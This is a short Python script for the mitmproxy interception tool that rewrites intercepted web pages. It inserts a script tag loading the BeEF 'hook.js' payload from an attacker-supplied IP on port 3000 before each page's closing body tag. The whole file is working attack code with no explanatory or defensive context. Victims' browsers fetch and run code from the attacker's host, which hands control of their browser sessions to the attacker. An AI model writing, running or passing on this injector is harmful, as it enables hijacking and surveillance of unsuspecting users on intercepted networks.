# Usage: mitmdump -s "injector.py hook_ip"
# (this script works best with --anticache)
try:
    from mitmproxy.models import decoded # mitmproxy 0.17
except:
    from libmproxy.models import decoded # mitmproxy 0.15
    
def start(context, argv):
    if len(argv) != 2:
        raise ValueError('Usage: -s "inject_beef.py server"')
    context.hook_ip = argv[1]

def response(context, flow):
    replace_str = "</body>"
    replace_content = "<script src='http://"+context.hook_ip+":3000/hook.js'></script>"
    
    if "text/html" in flow.response.headers['Content-Type']:
        with decoded(flow.response):
            if replace_str in flow.response.content:
                flow.response.content = flow.response.content.replace(replace_str, replace_content + replace_str)
                context.log("hook.js injected!")
    else:
        pass
